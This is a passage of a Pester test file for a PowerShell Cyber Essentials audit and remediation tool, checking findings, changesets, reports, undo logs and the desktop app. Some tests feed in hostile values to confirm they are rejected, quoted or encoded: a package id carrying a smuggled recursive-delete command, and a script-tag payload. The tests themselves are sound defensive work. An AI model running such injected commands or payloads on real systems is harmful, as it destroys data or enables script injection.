            $rows = @(ConvertFrom-CEWingetTable -Lines $lines)
            ($rows | ForEach-Object { $_.Id }) -join ',' | Should -Be "7zip.7zip,Microsoft.VisualStudioCode,Contoso.SomeVeryLongApp$ell,Discord.Discord"
            $rows[0].Available | Should -Be '25.01'
            $rows[1].Name | Should -Be 'Microsoft Visual Studio Code (User)'
            $rows[2].Truncated | Should -BeTrue
            $rows[3].Version | Should -Be '1.0.9163'
            @($rows | Where-Object { $_.Name -match '^(Name|-+)' -or $_.Id -match '^-+$' }).Count | Should -Be 0
        }
    }

    It 'offers no automatic fix for a winget id that was shortened' {
        Set-TestDevice -Kind Insecure
        Mock -ModuleName CEAudit Get-CEWingetUpgrades {
            [pscustomobject]@{ Available = $true; Packages = @([pscustomobject]@{ Name = 'Long App'; Id = "Contoso.Lo$([char]0x2026)"; Version = '1'; Available = '2'; Source = 'winget'; Truncated = $true }) }
        }
        $f = @(Invoke-CEAuditCore -Id 'SU-05')
        $f[0].Status | Should -Be 'Fail'
        $f[0].Remediation | Should -BeNullOrEmpty
    }

    It 'returns nothing for "No installed package found"' {
        InModuleScope CEAudit {
            @(ConvertFrom-CEWingetTable -Lines @('No installed package found matching input criteria.')).Count | Should -Be 0
        }
    }
}

Describe 'Audit of an insecure device' {
    BeforeAll {
        Set-TestDevice -Kind Insecure
        $script:findings = @(Invoke-CEAuditCore)
        $script:byId = @{}
        foreach ($f in $script:findings) { $script:byId[$f.FindingId] = $f }
    }

    It 'produces no Error findings (every check handled its inputs)' {
        $errors = @($script:findings | Where-Object Status -eq 'Error')
        ($errors | ForEach-Object { "$($_.FindingId): $($_.Actual)" }) -join "`n" | Should -BeNullOrEmpty
    }

    It 'fails the firewall, autorun, lockout and PIN checks' {
        $script:byId['FW-01'].Status | Should -Be 'Fail'
        $script:byId['FW-02'].Status | Should -Be 'Fail'
        $script:byId['SC-05'].Status | Should -Be 'Fail'
        $script:byId['SC-07'].Status | Should -Be 'Fail'
        $script:byId['SC-08'].Status | Should -Be 'Fail'
    }

    It 'flags the risky public inbound rule and RDP without NLA' {
        $script:byId['FW-03:Old-game-server'].Status | Should -Be 'Warn'
        $script:byId['FW-04:NLA'].Status | Should -Be 'Fail'
    }

    It 'flags account problems' {
        $script:byId['SC-01'].Status | Should -Be 'Fail'
        $script:byId['SC-02'].Status | Should -Be 'Fail'
        $script:byId['SC-03:olduser'].Status | Should -Be 'Warn'
        $script:byId['SC-04:olduser'].Status | Should -Be 'Fail'
    }

    It 'detects the everyday account is an admin when elevated as the same user' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ RunningAs = 'TESTPC\paul'; ConsoleUser = 'TESTPC\paul' }
        $f = @(Invoke-CEAuditCore -Id 'UA-01')[0]
        $f.Status | Should -Be 'Fail'
    }

    It 'detects a split-token admin when not elevated' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false; RunningAs = 'TESTPC\paul' }
        $f = @(Invoke-CEAuditCore -Id 'UA-01')[0]
        $f.Status | Should -Be 'Fail'
        Set-TestDevice -Kind Insecure
    }

    It 'raises the auto-fail patching and app update findings' {
        $script:byId['SU-03:Overdue'].Status | Should -Be 'Fail'
        $script:byId['SU-03:Overdue'].AutoFail | Should -BeTrue
        $script:byId['SU-05:7zip-7zip'].Status | Should -Be 'Fail'
        $script:byId['SU-05:7zip-7zip'].AutoFail | Should -BeTrue
    }

    It 'flags end-of-life software' {
        $f = $script:findings | Where-Object { $_.CheckId -eq 'SU-06' -and $_.Subject -like 'Python 3.8*' }
        $f.Status | Should -Be 'Fail'
    }

    It 'flags disabled automatic updates and blocked Chrome updates' {
        $script:byId['SU-02:Automatic-updates'].Status | Should -Be 'Fail'
        $script:byId['SU-07:Google-Chrome'].Status | Should -Be 'Fail'
    }

    It 'flags malware protection gaps' {
        $script:byId['MP-01'].Status | Should -Be 'Fail'
        $script:byId['MP-02'].Status | Should -Be 'Fail'
        $script:byId['MP-03'].Status | Should -Be 'Fail'
        $script:byId['MP-05:Network-protection'].Status | Should -Be 'Fail'
        $script:byId['MP-10:Path-C'].Status | Should -Be 'Fail'
        $script:byId['MP-10:Extension-exe'].Status | Should -Be 'Fail'
        $script:findings | Where-Object { $_.FindingId -like 'MP-10:Path-C-Tools*' } | Should -BeNullOrEmpty
    }

    It 'marks MFA as needing attestation for detected cloud services' {
        $f = $script:findings | Where-Object { $_.CheckId -eq 'UA-07' -and $_.Subject -like 'Microsoft 365*' }
        $f.Status | Should -Be 'Manual'
    }

    It 'warns that Windows 11 24H2 Pro is close to end of servicing' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ Build = 26100; DisplayVersion = '24H2' }
        Mock -ModuleName CEAudit Get-Date { [datetime]'2026-09-16' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Warn'
        $f.Actual | Should -Match '2026-10-13'
        Set-TestDevice -Kind Insecure
    }

    It 'fails Windows 10' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ OSFamily = 'Windows 10'; Build = 19045 }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Fail'
        $f.AutoFail | Should -BeTrue
        Set-TestDevice -Kind Insecure
    }

    It 'skips admin-only checks when not elevated' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        $f = @(Invoke-CEAuditCore -Id 'NC-01')[0]
        $f.Status | Should -Be 'Skipped'
        Set-TestDevice -Kind Insecure
    }

    It 'turns an exception inside a check into an Error finding' {
        Mock -ModuleName CEAudit Get-NetFirewallProfile { throw 'boom' }
        $f = @(Invoke-CEAuditCore -Id 'FW-01')[0]
        $f.Status | Should -Be 'Error'
        $f.Actual | Should -Match 'boom'
        Set-TestDevice -Kind Insecure
    }

    Context 'changeset' {
        BeforeAll {
            $script:cs = New-CEChangeset -Findings $script:findings -Context (New-TestContext)
        }

        It 'creates sequential item ids' {
            $script:cs.Items.Count | Should -BeGreaterThan 10
            $script:cs.Items[0].ItemId | Should -Be 'C001'
            ($script:cs.Items.ItemId | Sort-Object -Unique).Count | Should -Be $script:cs.Items.Count
        }

        It 'puts auto-fail fixes first' {
            $script:cs.Items[0].AutoFail | Should -BeTrue
            $firstNonAuto = [array]::IndexOf(@($script:cs.Items.AutoFail), $false)
            @($script:cs.Items | Select-Object -Skip $firstNonAuto | Where-Object AutoFail).Count | Should -Be 0
        }

        It 'merges findings that share a remediation' {
            $wu = @($script:cs.Items | Where-Object { $_.RemediationId -eq 'WindowsUpdate-InstallSecurity' })
            $wu.Count | Should -Be 1
        }

        It 'does not pre-select high-risk items' {
            $script:cs.Items | Where-Object Risk -eq 'High' | ForEach-Object { $_.Selected | Should -BeFalse }
        }

        It 'lists findings without automated fixes as manual actions' {
            $script:cs.ManualActions.FindingId | Should -Contain 'SC-09'
            $script:cs.ManualActions.FindingId | Should -Contain 'SU-06:Python-3-8-10-64-bit'
        }

        It 'round-trips through JSON' {
            $json = $script:cs | ConvertTo-Json -Depth 8
            $back = $json | ConvertFrom-Json
            $back.Items.Count | Should -Be $script:cs.Items.Count
            $back.SchemaVersion | Should -Be 1
        }
    }

    Context 'reports' {
        It 'writes json, markdown and html' {
            $out = Join-Path $TestDrive 'out'
            $r = Export-CEReport -Findings $script:findings -Context (New-TestContext) -OutputPath $out
            foreach ($p in $r.Paths.PSObject.Properties.Value) { Test-Path $p | Should -BeTrue }
            $r.Summary.Verdict | Should -Match '^FAIL'
            $fw = @($script:findings | Where-Object Category -eq 'Firewalls')
            $p = Export-CEReport -Findings $fw -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'out-partial') -PartialRun
            $p.Summary.Verdict | Should -Match '^PARTIAL: \d+ of 57 checks run$' -Because 'a partial run gives no FAIL/READY verdict even with failures'
            (Get-Content $r.Paths.Html -Raw) | Should -Match 'Cyber Essentials Plus readiness'
            (Get-Content $r.Paths.Markdown -Raw) | Should -Match 'Automatic-fail items'
            ($r.Summary.CEPlus | Where-Object TestCase -eq 'TC2').State | Should -Be 'Likely fail'
            ($r.Summary.CEPlus | Where-Object TestCase -eq 'TC5').State | Should -Be 'Likely fail'
        }

        It 'HTML-encodes finding text' {
            $f = @($script:findings)[0].PSObject.Copy()
            $f.Actual = '<script>alert(1)</script>'
            $out = Join-Path $TestDrive 'enc'
            $r = Export-CEReport -Findings @($f) -Context (New-TestContext) -OutputPath $out
            (Get-Content $r.Paths.Html -Raw) | Should -Not -Match '<script>alert'
        }
    }
}

Describe 'Audit of a hardened device' {
    BeforeAll {
        Set-TestDevice -Kind Secure
        $script:findings = @(Invoke-CEAuditCore)
    }

    It 'has no failures or errors' {
        $bad = @($script:findings | Where-Object { @('Fail', 'Error') -contains $_.Status })
        ($bad | ForEach-Object { "$($_.FindingId) [$($_.Status)] $($_.Actual)" }) -join "`n" | Should -BeNullOrEmpty
    }

    It 'does not claim READY for a partial run' {
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F -PartialRun }
        $summary.Verdict | Should -Be 'PARTIAL: 1 of 57 checks run'
        $summary.PartialRun | Should -BeTrue
        $out = Join-Path $TestDrive 'partial'
        $r = Export-CEReport -Findings $f -Context (New-TestContext) -OutputPath $out -PartialRun
        $r.Summary.Verdict | Should -Be 'PARTIAL: 1 of 57 checks run'
        (Get-Content $r.Paths.Html -Raw) | Should -Match ([regex]::Escape("<div class='msg'>PARTIAL: 1 of 57 checks run</div>"))
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('## PARTIAL: 1 of 57 checks run'))
        # A check can run without leaving a finding, so the engine's count wins over the findings.
        $progress = @{}
        $f = @(Invoke-CEAuditCore -Id 'NC-08', 'NC-07' -ProgressState $progress)
        $progress.Done | Should -Be 2
        $r = Export-CEReport -Findings @($f | Where-Object CheckId -eq 'NC-08') -Context (New-TestContext) -OutputPath $out -PartialRun -ChecksRun $progress.Done
        $r.Summary.Verdict | Should -Be 'PARTIAL: 2 of 57 checks run'
    }

    It 'still asks for manual attestation (MFA, software review, backups)' {
        $summary = InModuleScope CEAudit -Parameters @{ F = $script:findings } { param($F) Get-CESummary -Findings $F }
        $summary.Verdict | Should -Match '^NEEDS REVIEW'
    }

    It 'passes once MFA is attested' {
        InModuleScope CEAudit {
            $cfg = Get-CEConfig
            $orig = $cfg.'cloud-services'
            try {
                $cfg.'cloud-services' = [pscustomobject]@{
                    maxAttestationAgeDays = 365
                    services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT admin' })
                    detectionHints = $orig.detectionHints
                }
                $f = @(Invoke-CEAuditCore -Id 'UA-07')
                $f.Status | Should -Be 'Pass'
            }
            finally { $cfg.'cloud-services' = $orig }
        }
    }

    It 'fails when a service is attested without MFA' {
        InModuleScope CEAudit {
            $cfg = Get-CEConfig
            $orig = $cfg.'cloud-services'
            try {
                $cfg.'cloud-services' = [pscustomobject]@{
                    maxAttestationAgeDays = 365
                    services = @([pscustomobject]@{ name = 'Xero'; mfaEnforced = $false; adminMfaEnforced = $false; verifiedOn = '2026-09-01'; verifiedBy = 'IT admin' })
                    detectionHints = @()
                }
                $f = @(Invoke-CEAuditCore -Id 'UA-07')
                $f.Status | Should -Be 'Fail'
                $f.AutoFail | Should -BeTrue
            }
            finally { $cfg.'cloud-services' = $orig }
        }
    }
}

Describe 'Remediation engine' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'refuses unknown remediation ids' {
        { Invoke-CERemediation -Id 'Evil-Thing' -Parameters @{} } | Should -Throw '*Unknown remediation*'
    }

    It 'rejects injected winget package ids' {
        { Invoke-CERemediation -Id 'Winget-Upgrade' -Parameters @{ PackageId = 'foo; Remove-Item C:\ -Recurse' } } | Should -Throw '*not allowed*'
    }

    It 'rejects optional features outside the allow list' {
        { Invoke-CERemediation -Id 'OptionalFeature-Disable' -Parameters @{ FeatureName = 'Microsoft-Hyper-V' } } | Should -Throw '*not one of*'
    }

    It 'rejects out-of-range lockout thresholds' {
        { Invoke-CERemediation -Id 'AccountLockout-Set' -Parameters @{ Threshold = 50; DurationMinutes = 10; WindowMinutes = 10 } } | Should -Throw '*outside*'
    }

    It 'rejects ASR rule ids that are not in config' {
        { Invoke-CERemediation -Id 'Defender-ASR' -Parameters @{ Mode = 'Block'; RuleIds = @('00000000-0000-0000-0000-000000000000') } } | Should -Throw
    }

    It 'requires elevation for machine changes' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        { Invoke-CERemediation -Id 'Autorun-Disable' } | Should -Throw '*elevated*'
        Set-TestDevice -Kind Insecure
    }

    It 'does nothing under -WhatIf' {
        Mock -ModuleName CEAudit Set-CERegistryValueTracked { throw 'should not be called' }
        $r = Invoke-CERemediation -Id 'Autorun-Disable' -WhatIf
        $r.Status | Should -Be 'WhatIf'
    }

    It 'records registry undo information' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 0; Kind = 'DWord' } }
            Mock Test-Path { $true }
            Mock New-ItemProperty { }
            $undo = New-Object System.Collections.Generic.List[object]
            Set-CERegistryValueTracked -Path 'HKLM:\X' -Name 'Y' -Value 1 -Undo $undo
            $undo.Count | Should -Be 1
            $undo[0].Existed | Should -BeTrue
            $undo[0].Value | Should -Be 0
            Should -Invoke New-ItemProperty -Times 1
        }
    }

    It 'skips registry writes that are already in the desired state' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 1; Kind = 'DWord' } }
            Mock New-ItemProperty { }
            $undo = New-Object System.Collections.Generic.List[object]
            Set-CERegistryValueTracked -Path 'HKLM:\X' -Name 'Y' -Value 1 -Undo $undo
            $undo.Count | Should -Be 0
            Should -Invoke New-ItemProperty -Times 0
        }
    }

    It 'applies a hardening remediation and returns its undo records' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $false; Value = $null; Kind = $null } }
            Mock Test-Path { $true }
            Mock New-ItemProperty { }
            $r = Invoke-CERemediation -Id 'Hardening-RestrictAnonymous'
            $r.Status | Should -Be 'Applied'
            @($r.Undo).Count | Should -Be 2
            $r.RequiresReboot | Should -BeTrue
        }
    }

    It 'quotes undo command literals safely' {
        InModuleScope CEAudit {
            ConvertTo-CEPSLiteral "it's; Remove-Item x" | Should -Be "'it''s; Remove-Item x'"
            ConvertTo-CEPSLiteral 5 | Should -Be '5'
            ConvertTo-CEPSLiteral $true | Should -Be '$true'
        }
    }

    It 'refuses to disable the built-in admin when it is the only admin' {
        InModuleScope CEAudit {
            Mock Get-LocalUser { [pscustomobject]@{ Name = 'Administrator'; SID = 'S-1-5-21-1-500'; Enabled = $true } }
            Mock Get-LocalGroupMember { [pscustomobject]@{ Name = 'PC\Administrator'; SID = 'S-1-5-21-1-500'; PrincipalSource = 'Local' } }
            Mock Disable-LocalUser { }
            $r = Invoke-CERemediation -Id 'LocalUser-DisableBySidSuffix' -Parameters @{ SidSuffix = 500 }
            $r.Status | Should -Be 'Failed'
            $r.Message | Should -Match 'no other enabled administrator'
            Should -Invoke Disable-LocalUser -Times 0
        }
    }
}

Describe 'Applying a changeset' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'skips admin-only items when not elevated and writes no undo log' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        $cs = Join-Path $TestDrive 'changeset.json'
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs
        $r.Skipped | Should -Be 1
        $r.Applied | Should -Be 0
        $r.UndoPath | Should -BeNullOrEmpty
        Set-TestDevice -Kind Insecure
    }

    It 'applies items, writes an undo log and re-runs the related checks' {
        Mock -ModuleName CEAudit Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $false; Value = $null; Kind = $null } }
        Mock -ModuleName CEAudit Test-Path { $true }
        Mock -ModuleName CEAudit New-ItemProperty { }
        $cs = Join-Path $TestDrive 'changeset.json'
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs
        $r.Applied | Should -Be 1
        Test-Path $r.UndoPath | Should -BeTrue
        $log = Get-Content $r.UndoPath -Raw | ConvertFrom-Json
        @($log.Items[0].Undo).Count | Should -Be 3
        @($r.Verification).CheckId | Should -Contain 'SC-05'
        # @() matters: one result is a single object, which has no .Count in Windows PowerShell 5.1.
        @(Get-CEUndoLogs -OutputRoot $TestDrive).Count | Should -BeGreaterThan 0
    }

    It 'makes no changes and writes no log under -WhatIf' {
        Mock -ModuleName CEAudit New-ItemProperty { throw 'should not write' }
        $cs = Join-Path (Join-Path $TestDrive 'wi') 'changeset.json'
        New-Item -ItemType Directory -Path (Split-Path $cs) -Force | Out-Null
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs -WhatIf
        $r.WhatIf | Should -BeTrue
        $r.UndoPath | Should -BeNullOrEmpty
        @(Get-ChildItem (Split-Path $cs) -Filter 'undo-*').Count | Should -Be 0
    }
}

Describe 'Desktop app result rendering' {
    # WPF isn't available everywhere, so load the app's functions and render
    # into stand-in controls. Catches PowerShell pitfalls in the UI code, such
    # as empty DataTables being unrolled to $null on return.
    BeforeAll {
        Set-TestDevice -Kind Insecure
        $f = @(Invoke-CEAuditCore)
        $script:guiOut = Join-Path $TestDrive 'gui'
        $rep = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath $script:guiOut
        $script:guiResult = [pscustomobject]@{ Findings = $f; Context = $global:CETestCtx; Summary = $rep.Summary; Changeset = $rep.Changeset; Folder = $script:guiOut; Paths = $rep.Paths }

        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $script:guiFunctions = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false) | ForEach-Object { $_.Extent.Text })
    }

    It 'renders fresh and saved results without errors' {
        foreach ($fn in $script:guiFunctions) { . ([scriptblock]::Create($fn)) }
        function Get-Brush { 'brush' }
        function New-Tile { 'tile' }
        function New-CEFrameworkBar { param($Label, $Fraction, $Percent, $Deviation) 'bar' }
        function New-CEAiLine { param([string]$Text, [switch]$Bad) 'line' }
        function Set-CEStatusStack { param($CheckMap) }
        function New-CELegendItem { param([string]$Colour, [string]$Text) 'legend' }
        function Set-UiRichText { param($Block, [object[]]$Parts) $Block.Text = (@($Parts | ForEach-Object { $_['Text'] }) -join '') }
        function Set-UiTabHeader { param($Tab, [string]$Label, $Count) $Tab.Header = "$Label $Count" }
        function Set-UiTabsEnabled { param([bool]$On) }
        function Get-CEAiPosture { param($Context) [ordered]@{ agentsFound = 1; contained = $true; deviations = 0; agents = @([ordered]@{ name = 'Test agent'; elevated = $false; asSystem = $false; running = $true }); environments = @([ordered]@{ type = 'wsl'; name = 'Debian'; wslVersion = 2; defaultUidRoot = $false; autoMount = $true; networking = 'nat' }) } }
        # Read by the app functions via dynamic scope.
        Set-Variable -Name statusOrder -Value @('Pass', 'Fail', 'Warn', 'Manual', 'Skipped', 'NotApplicable', 'Error')
        Set-Variable -Name themeLabels -Value ([ordered]@{ Firewalls = 'Firewalls'; SecureConfiguration = 'Secure configuration'; SecurityUpdateManagement = 'Security update management'; UserAccessControl = 'User access control'; MalwareProtection = 'Malware protection'; NCSCHardening = 'NCSC hardening (beyond CE)' })
        $script:OutputRoot = $TestDrive
        $script:FindingScope = $null
        $ui = @{}
        foreach ($n in 'VerdictBanner', 'VerdictText', 'VerdictSub', 'TcGrid', 'ThemeGrid', 'FindingsGrid', 'ChangesGrid', 'ManualGrid', 'HistoryGrid', 'ChangesTab', 'ManualTab', 'HistoryTab', 'OpenReportBtn', 'OpenFolderBtn', 'FindingCount', 'SelCount') {
            $ui[$n] = [pscustomobject]@{ BorderBrush = $null; Text = ''; Foreground = $null; ItemsSource = $null; Header = ''; IsEnabled = $false }
        }
        $ui.Tiles = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.FwBars = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.AiAgentsGrid = [pscustomobject]@{ ItemsSource = $null; Visibility = '' }
        $ui.AiAgentsEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.AiMcpGrid = [pscustomobject]@{ ItemsSource = $null; Visibility = '' }
        $ui.AiMcpEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.AiMcpMeta = [pscustomobject]@{ Text = '' }
        $ui.AiEnvs = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.AiControlsLink = [pscustomobject]@{ Text = '' }
        $ui.AiLine = [pscustomobject]@{ Visibility = '' }
        $ui.AiLineText = [pscustomobject]@{ Text = '' }
        $ui.ActMeta = [pscustomobject]@{ Text = '' }
        $ui.OvEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.OvBody = [pscustomobject]@{ Visibility = '' }
        $ui.StatusStack = [pscustomobject]@{ Child = $null }
        $ui.StatusLegend = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.ThemeFilter = [pscustomobject]@{ SelectedValue = '(all)' }
        $ui.StatusFilter = [pscustomobject]@{ SelectedValue = 'Needs action' }
        $ui.SearchBox = [pscustomobject]@{ Text = '' }

        Show-Results $script:guiResult
        $ui.TcGrid.ItemsSource.Count | Should -Be 5
        $ui.FindingCount.Text | Should -Match 'shown'
        $ui.SelCount.Text | Should -Match 'ticked'
        $ui.AiLine.Visibility | Should -Be 'Visible'
        $ui.AiLineText.Text | Should -Match 'AI tool'
        $ui.OvBody.Visibility | Should -Be 'Visible'
        $ui.VerdictText.Text | Should -Not -BeNullOrEmpty
        $ui.ChangesTab.Header | Should -Match '^Fixes \d+$'
        $ui.FwBars.Children.Count | Should -Be 3
        @($ui.AiAgentsGrid.ItemsSource).Count | Should -BeGreaterThan 0
        $ui.AiMcpEmpty.Visibility | Should -Be 'Visible'
        $ui.AiControlsLink.Text | Should -Match 'AI-related control'

        Show-Results (Import-SavedResults (Join-Path $script:guiOut 'findings.json'))
        $ui.ChangesGrid.ItemsSource.Count | Should -Be @($script:guiResult.Changeset.Items).Count
    }
}

Describe 'Desktop app: choosing checks' {
    BeforeAll {
        Set-TestDevice -Kind Secure
        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $script:guiFunctions = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false) | ForEach-Object { $_.Extent.Text })
        $script:allIds = @(Get-CECheck | ForEach-Object { $_.Id } | Sort-Object)
        $script:ceIds = @(Get-CECheck -Framework 'CE' | ForEach-Object { $_.Id } | Sort-Object)
    }
    BeforeEach {
        foreach ($fn in $script:guiFunctions) { . ([scriptblock]::Create($fn)) }
        $script:UiSettingsPath = Join-Path $TestDrive "settings-$([guid]::NewGuid().ToString('n')).json"
        function Write-UiLog { param($Text) }
    }

    It 'resolves ticked checks to All, the Cyber Essentials preset, or a custom choice' {
        (Resolve-UiCheckSelection -Ids $script:allIds).Mode | Should -Be 'All'
        (Resolve-UiCheckSelection -Ids $script:ceIds).Mode | Should -Be 'CE'
        $custom = Resolve-UiCheckSelection -Ids @('UA-10', 'FW-01', 'FW-01', 'XX-99')
        $custom.Mode | Should -Be 'Custom'
        $custom.Ids | Should -Be @('FW-01', 'UA-10') -Because 'duplicates and unknown ids are dropped, and ids are sorted'
        (Resolve-UiCheckSelection -Ids @()).Mode | Should -Be 'Custom'
        @((Resolve-UiCheckSelection -Ids @()).Ids).Count | Should -Be 0
    }

    It 'works out theme tick boxes: all, none or partly ticked' {
        $ids = @('FW-01', 'FW-02', 'FW-03')
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-01' = $true; 'FW-02' = $true; 'FW-03' = $true } | Should -BeTrue
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-01' = $false } | Should -BeFalse
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-02' = $true } | Should -BeNullOrEmpty
    }

    It 'describes the choice for the toolbar' {
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'All'; Ids = $script:allIds }) | Should -Be "All $($script:allIds.Count) checks"
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'CE'; Ids = $script:ceIds }) | Should -Be "Cyber Essentials only ($($script:ceIds.Count) checks)"
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'Custom'; Ids = @('FW-01', 'UA-10') }) | Should -Be "2 of $($script:allIds.Count) checks"
    }

    It 'groups checks by control theme in report order' {
        $groups = Get-UiCheckGroup
        ($groups | ForEach-Object { $_.Id }) | Should -Be @('Firewalls', 'SecureConfiguration', 'SecurityUpdateManagement', 'UserAccessControl', 'MalwareProtection', 'NCSCHardening')
        @($groups | ForEach-Object { $_.Checks } | ForEach-Object { $_.Id }).Count | Should -Be $script:allIds.Count
        ($groups[0].Checks | ForEach-Object { $_.Id }) | Should -Be @('FW-01', 'FW-02', 'FW-03', 'FW-04', 'FW-05', 'FW-06', 'FW-07')
    }

    It 'saves and reloads the choice, dropping checks that no longer exist' {
        (Read-UiCheckSelection).Mode | Should -Be 'All' -Because 'there is no settings file yet'
        Save-UiCheckSelection ([pscustomobject]@{ Mode = 'Custom'; Ids = @('FW-01', 'UA-10') })
        $back = Read-UiCheckSelection
        $back.Mode | Should -Be 'Custom'
        $back.Ids | Should -Be @('FW-01', 'UA-10')

        Save-UiCheckSelection ([pscustomobject]@{ Mode = 'CE'; Ids = $script:ceIds })
        (Read-UiCheckSelection).Mode | Should -Be 'CE'

        Set-Content -LiteralPath $script:UiSettingsPath -Value '{ "checkSelection": { "mode": "Custom", "ids": ["ZZ-01", "ZZ-02"] } }'
        (Read-UiCheckSelection).Mode | Should -Be 'All' -Because 'a choice with no known checks falls back to all'
        Set-Content -LiteralPath $script:UiSettingsPath -Value '{ not json'
        (Read-UiCheckSelection).Mode | Should -Be 'All'
    }

    It 'the chooser window layout is valid XAML' {
        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $start = $src.IndexOf("`$chooserXaml = @'") + 17
        $end = $src.IndexOf("'@", $start)
        [xml]$doc = $src.Substring($start, $end - $start).Trim()
        foreach ($n in 'AllBtn', 'CeBtn', 'ClearBtn', 'SearchBox', 'CancelBtn', 'OkBtn', 'CountText', 'AdminText', 'Tree') {
            @($doc.SelectNodes("//*[@*[local-name()='Name']='$n']")).Count | Should -Be 1 -Because "Show-CheckChooser looks up $n"
        }
    }
}

Describe 'Intune: status, discovery and compliance rules' {
    BeforeAll {
        $script:intune = Join-Path $script:RepoRoot 'intune'
        . (Join-Path $script:intune 'Discover-CECompliance.ps1')
        $script:strictRules = Join-Path $script:intune 'compliance-rules.json'
        $script:softRules = Join-Path $script:intune 'compliance-rules-autofail-only.json'
        $script:fwRules = Join-Path $script:intune 'compliance-rules-frameworks.json'

        function global:New-TestStatus {
            param([string]$Kind, [string]$DataRoot, [switch]$AttestMfa)
            Set-TestDevice -Kind $Kind
            if ($AttestMfa) {
                InModuleScope CEAudit {
                    $cfg = Get-CEConfig
                    $cfg.'cloud-services' = [pscustomobject]@{
                        maxAttestationAgeDays = 365
                        services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT' })
                        detectionHints = $cfg.'cloud-services'.detectionHints
                    }
                }
            }
            $f = @(Invoke-CEAuditCore)
            $summary = Get-CESummary -Findings $f
            $status = ConvertTo-CEStatus -Findings $f -Summary $summary -Context $global:CETestCtx -ReportFolder 'X'
            New-Item -ItemType Directory -Path $DataRoot -Force | Out-Null
            Write-CEStatus -Status $status -Path (Join-Path $DataRoot 'status.json') | Out-Null
            if ($AttestMfa) { InModuleScope CEAudit { Get-CEConfig -Force | Out-Null } }
            return $status
        }
    }

    It 'builds a status document with worst status per check' {
        $root = Join-Path $TestDrive 'insecure'
        $st = New-TestStatus -Kind Insecure -DataRoot $root
        $st.schemaVersion | Should -Be 1
        $st.autoFailCount | Should -BeGreaterThan 0
        $st.checks.'SU-05'.status | Should -Be 'Fail'
        $st.checks.'SU-05'.scope | Should -Be 'Machine'
        $st.checks.'UA-07'.status | Should -Be 'Manual'
        $st.frameworks.'ce-v3.3'.metPct | Should -BeLessThan 100
        $st.autoFails | Should -Contain 'SU-03'
        (Get-Content (Join-Path $root 'status.json') -Raw | ConvertFrom-Json).autoFailCount | Should -Be $st.autoFailCount
    }

    It 'derives per-framework rollups from self-describing checks and carries no verdict' {
